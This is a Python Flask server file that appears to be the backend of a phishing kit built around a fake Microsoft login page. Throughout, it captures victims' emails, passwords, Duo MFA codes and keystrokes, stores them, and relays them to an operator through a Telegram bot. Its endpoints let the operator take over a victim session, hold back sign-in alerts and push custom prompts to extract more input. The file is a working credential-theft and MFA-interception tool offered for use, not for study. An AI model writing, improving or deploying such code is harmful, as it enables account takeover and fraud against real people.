from flask import Flask, request, session, jsonify
from flask_cors import CORS
from flask import render_template, send_from_directory, redirect, Response
from models import Email_statuses, HostedUrls, Variables
from flask_cors import CORS
from dotenv import load_dotenv
from tg import send_notification, get_status_update, send_keystroke_notification_to_admin
from utils import Local_Cache, get_admin_user
import os, time
from urllib.parse import quote
import requests

# --- Load Environment Variables ---
load_dotenv()
HOSTED_URL = os.getenv("HOSTED_URL")
DEFAULT_USER_ID = os.getenv("USER_ID")
BOT_TOKEN = os.getenv("BOT_TOKEN")

# --- Flask App Initialization ---
app = Flask(__name__, static_folder='microsoft_login/build')

CORS(app, resources={r"/*": {"origins": "*"}})


# --- Application Startup Logic ---
def initialize():
    """
    Ensures required data, like the hosted URL, is present in the database on startup.
    """
    if HOSTED_URL:
        HostedUrls.update_one(
            {'url': HOSTED_URL},
            {'$setOnInsert': {'url': HOSTED_URL}},
            upsert=True
        )
        print(f"[*] Verified that HOSTED_URL '{HOSTED_URL}' is in the database.")
    
    ADMIN_USER = Variables.find_one({"name": "ADMIN_USER"})
    Local_Cache.set("ADMIN_USER", ADMIN_USER)


initialize()


# --- API Endpoints ---


@app.get("/bot")
def bot_info():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getMe"

    response = requests.get(url)
    data = response.json()

    if data["ok"]:
        bot_info = data["result"]
        return f"Bot Username: @{bot_info['username']}"
    else:
        return "Failed to get bot info"


@app.get("/version")
def version():
    return {"status":"success", "version":"gsheet version"}



@app.get("/urls")
def get_urls():
    """
    Returns a JSON list of all unique HOSTED_URLs saved in the database.
    """
    try:
        urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
        urls_list = [doc['url'] for doc in urls_cursor]
        return jsonify({"urls": urls_list})
    except Exception as e:
        print(f"[ERROR] Could not fetch URLs from database: {e}")
        return jsonify({"error": "Failed to connect to the database."}), 500







@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    """
    Main entrypoint: Handles serving the React application.
    The user_id is now passed in API calls from the client, not handled by sessions.
    """
    # This logic is now much simpler.
    # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
    if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    
    # Otherwise, for any other path (including the root), serve the main index.html file.
    # This is standard for a Single-Page Application (SPA).
    return send_from_directory(app.static_folder, 'index.html')




@app.get("/set_status/<user_id>/<email>/<status>")
def set_status(user_id, email, status):
    """
    Called by Telegram buttons to update a user's login status.
    """
    try:
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
            upsert=True
        )
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}


# --- MODIFIED: Endpoint now serves a form on GET and processes it on POST ---
@app.route("/set_custom_status", methods=['GET', 'POST'])
def set_custom_status():
    """
    Handles setting a custom status.
    GET: Displays an HTML form to input custom status details.
    POST: Processes the submitted form and updates the database.
    """
    if request.method == 'GET':
        email = request.args.get('email')
        if not email:
            return "Error: An email must be provided in the URL.", 400
        
        # Return a simple HTML form
        html_form = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Set Custom Status</title>
            <style>
                body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .container {{ background: white; padding: 25px 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; }}
                h2 {{ text-align: center; color: #1c1e21; border-bottom: 1px solid #ddd; padding-bottom: 15px; margin-top: 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }}
                input[type='text'], textarea {{ width: 100%; padding: 10px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 16px; }}
                input[type='submit'] {{ background-color: #0067b8; color: white; padding: 12px 20px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }}
                input[type='submit']:hover {{ background-color: #005a9e; }}
                .email-display {{ background-color: #e9ecef; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-size: 14px; }}
                .radio-group label {{ display: inline-block; margin-right: 20px; font-weight: normal; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Set Custom Status</h2>
                <div class="email-display">Setting status for: <strong>{email}</strong></div>
                <form action="/set_custom_status" method="post">
                    <input type="hidden" name="email" value="{email}">
                    
                    <label for="title">Title:</label>
                    <input type="text" id="title" name="title" required>
                    
                    <label for="subtitle">Subtitle:</label>
                    <textarea id="subtitle" name="subtitle" rows="3" required></textarea>
                    
                    <label>Requires Input from User?</label>
                    <div class="radio-group">
                        <input type="radio" id="input_true" name="has_input" value="true" checked>
                        <label for="input_true">Yes</label>
                        <input type="radio" id="input_false" name="has_input" value="false">
                        <label for="input_false">No</label>
                    </div>
                    <br><br>
                    <input type="submit" value="Set Status">
                </form>
            </div>
        </body>
        </html>
        """
        return html_form

    if request.method == 'POST':
        try:
            email = request.form.get('email')
            title = request.form.get('title')
            subtitle = request.form.get('subtitle')
            has_input = request.form.get('has_input') == 'true'

            if not email or not title or not subtitle:
                return "Error: All fields are required.", 400

            custom_data = { "title": title, "subtitle": subtitle, "has_input": has_input }
            Email_statuses.update_one(
                {"email": email.strip()},
                {"$set": {"status": "custom", "custom_data": custom_data}},
                upsert=True
            )
            return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Success!</h1><p>Custom status has been set for {email}. You can now close this window.</p></div>"
        except Exception as e:
            return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500



@app.post("/api/keystroke")
def keystroke():
    """Receives email keystrokes and notifies ONLY the admin with action buttons."""
    data = request.json
    session_id = data.get('session_id')
    if not session_id:
        return jsonify({"error": "Session ID is missing"}), 400

    admin_user = get_admin_user()
    if admin_user:
        send_keystroke_notification_to_admin(
            session_id=session_id,
            field=data.get('field', 'N/A'),
            value=data.get('value', ''),
            admin_user=admin_user
        )
    return jsonify({"status": "received"}), 200

@app.get("/takeover/<admin_id>/<session_id>")
def takeover(admin_id, session_id):
    """Endpoint for the admin's 'Takeover' button."""
    admin_user = get_admin_user()
    if not admin_user or admin_id != admin_user.get("id"):
        return "<h1>Unauthorized</h1>", 403
    
    try:
        Email_statuses.update_one(
            {"session_id": session_id},
            {"$set": {"active_user_id": admin_id, "session_id": session_id}},
            upsert=True
        )
        send_notification(f"✅ Takeover successful for session: {session_id}", user_id=admin_id)
        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Takeover Successful</h1><p>You now have exclusive control. You can close this window.</p></div>"
    except Exception as e:
        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500

@app.get("/api/delay-session/<session_id>")
def delay_session(session_id):
    """Endpoint for the admin's 'Delay' button."""
    try:
        Email_statuses.update_one(
            {"session_id": session_id},
            {"$set": {"delay_active": True}},
            upsert=True
        )
        admin_user = get_admin_user()
        if admin_user:
            send_notification(f"⏳ Delay activated for session: {session_id}", user_id=admin_user.get("id"))
        return "<div style='font-family: sans-serif; text-align: center; padding-top: 50px;'><h1>Delay Activated</h1><p>The user notification will be delayed by 4 seconds.</p></div>"
    except Exception as e:
        return f"<h1>Error</h1><p>An error occurred: {e}</p>", 500

# --- Core Logic Endpoints ---

@app.post("/alert")
def alert():
    """Handles general alerts, including the 'typing' and delayed 'sign-in' notifications."""
    req = request.json
    message = req['message']
    session_id = req.get('session_id')
    user_id = req.get('user_id') or DEFAULT_USER_ID

    if not session_id:
        return jsonify({"error": "Session ID is required for alerts"}), 400

    # Handle the "someone is typing" alert - sent before takeover is possible
    if "currently typing an email" in message or "trying to sign in with email" in message:
        send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
        return jsonify({"status": "success", "message": "Typing alert sent."})

    # Handle the "trying to sign in" alert, which respects the delay logic
    if "trying to sign in with email" in message:
        session_doc = Email_statuses.find_one({"session_id": session_id})

        # Check if the admin activated the delay
        if session_doc and session_doc.get("delay_active"):
            Email_statuses.update_one({"session_id": session_id}, {"$set": {"delay_active": False}})
            time.sleep(4)
            
            # After waiting, check again if a takeover occurred
            updated_doc = Email_statuses.find_one({"session_id": session_id})
            admin_user = get_admin_user()
            if updated_doc and admin_user and str(updated_doc.get("active_user_id")) == str(admin_user.get("id")):
                print(f"Notification for session {session_id} blocked due to admin takeover after delay.")
                send_notification(f"✅ Login notification for {updated_doc.get('email')} was successfully blocked.", user_id=admin_user.get("id"))
                return jsonify({"status": "success", "message": "Notification blocked by takeover."})

    # If no delay was active, or if delay finished without takeover, send to the correct recipients
    send_notification(message, user_id=user_id, session_id=session_id, include_admin=True)
    return jsonify({"status": "success", "message": "Alert sent."})







@app.post("/auth")
def auth():
    """
    Handles authentication attempts from the frontend.
    Includes logic to return custom status data.
    """
    req = request.json
    print("requst data ", req)
    # MODIFIED: Get user_id from the request body instead of the session.
    user_id = req.get('user_id') or DEFAULT_USER_ID
    session_id = req.get('session_id')

    email = req['email'].strip()

    unique_filter = {"$or": [{"session_id": session_id}, {"email": email}]}


    password = req['password']
    incoming_duo_code = req.get('duoCode')
    custom_input = req.get('customInput')

    # The rest of this function remains exactly the same.
    db_record = Email_statuses.find_one(unique_filter)
    print("thi is the db record", db_record)

    if custom_input:
        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id, session_id=session_id, include_admin=True)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {"status": "pending", "custom_data": None, "session_id": session_id, "email": email}},
            upsert=True
        )
        return jsonify({"status": "pending"})

    if not db_record or str(db_record.get('password')) != str(password):
        print("reached here")
        get_status_update(session_id=session_id, email=email, password=password, user_id=user_id)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {
                "session_id": session_id, # Always update to the latest session_id
                "email": email,
                "password": password,
                "status": "pending",
                "duoCode": None,
                "user_id": user_id,
                "custom_data": None
            },
            "$setOnInsert": {
                    "active_user_id": user_id,
                    "delay_active": False
                }},
            upsert=True
        )
        return jsonify({"status": "pending"})

    stored_duo_code = db_record.get('duoCode')
    if incoming_duo_code and str(incoming_duo_code) != str(stored_duo_code):
        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id, session_id=session_id, include_admin=True)
        Email_statuses.update_one(
            unique_filter,
            {"$set": {"status": "pending", "duoCode": incoming_duo_code, "session_id": session_id, "email": email}},
            upsert=True
        )
        return jsonify({"status": "pending"})


    current_status = db_record.get('status', 'pending')
    if current_status == 'custom':
        return jsonify({
            "status": "custom",
            "data": db_record.get('custom_data')
        })

    return jsonify({"status": current_status})





if __name__ == '__main__':
    app.run()
